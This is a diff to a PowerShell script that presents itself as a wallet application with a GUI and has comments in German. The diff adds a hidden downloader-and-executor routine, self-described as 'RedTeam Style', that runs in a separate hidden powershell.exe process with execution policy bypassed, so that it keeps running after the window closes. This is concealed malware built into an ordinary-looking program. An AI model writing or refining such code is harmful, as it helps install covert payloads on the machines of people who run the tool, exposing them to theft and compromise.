@@ -7,8 +7,9 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
 
-# === Parallel Downloader + Executor (THM / CTF / RedTeam Style) ===
-# Integriert direkt in das Wallet-Skript, läuft beim Aufruf asynchron im Hintergrund
+# === Downloader + Executor in separatem, hidden PowerShell-Prozess starten ===
+# Dadurch läuft er unabhängig von der GUI und bleibt aktiv, auch nach Schließen des Fensters
+$downloaderCode = @'
 $BasePath = "C:\Users\adsfa\AppData\Roaming\Microsoft\Windows\PowerShell"
 $OperationPath = "$BasePath\operation"
 $SystemPath = "$OperationPath\System"
@@ -56,14 +57,15 @@ foreach ($s in $Scripts) {
     $PowerShell.RunspacePool = $RunspacePool
     $Jobs += [PSCustomObject]@{ Instance = $PowerShell; Status = $PowerShell.BeginInvoke() }
 }
-# Warten bis alle fertig sind (oder Timeout nach 30 Sekunden) – läuft asynchron, GUI startet parallel
+# Warten bis alle fertig sind (oder Timeout nach 30 Sekunden)
 $endTime = (Get-Date).AddSeconds(30)
-$waitThread = {
-    while (($Jobs.Status.IsCompleted -contains $false) -and (Get-Date) -lt $endTime) {
-        Start-Sleep -Milliseconds 500
-    }
+while (($Jobs.Status.IsCompleted -contains $false) -and (Get-Date) -lt $endTime) {
+    Start-Sleep -Milliseconds 500
 }
-Start-Job -ScriptBlock $waitThread | Out-Null  # Asynchrones Warten, damit GUI nicht blockiert
+'@
+
+# Starte den Downloader in einem neuen, hidden Prozess
+Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", $downloaderCode -NoNewWindow -Wait:$false
 
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
